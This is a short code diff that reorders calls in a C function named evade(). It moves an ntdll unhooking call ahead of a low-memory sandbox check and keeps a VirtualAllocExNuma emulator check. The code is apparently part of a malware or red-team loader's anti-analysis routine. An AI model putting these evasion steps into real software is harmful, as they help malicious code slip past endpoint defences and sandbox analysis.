@@ -135,6 +135,8 @@ void evade() {
         exit(0);
     }
 
+    unhookNtll();
+
 	MEMORYSTATUSEX statex;
 	statex.dwLength = sizeof(statex);
 
@@ -145,7 +147,7 @@ void evade() {
 	if (totalPhysicalMemoryInGB <= 1) {
 		exit(1);
 	}
-    unhookNtll();
+    
     CheckVirtualAllocExNuma();  
 };
 
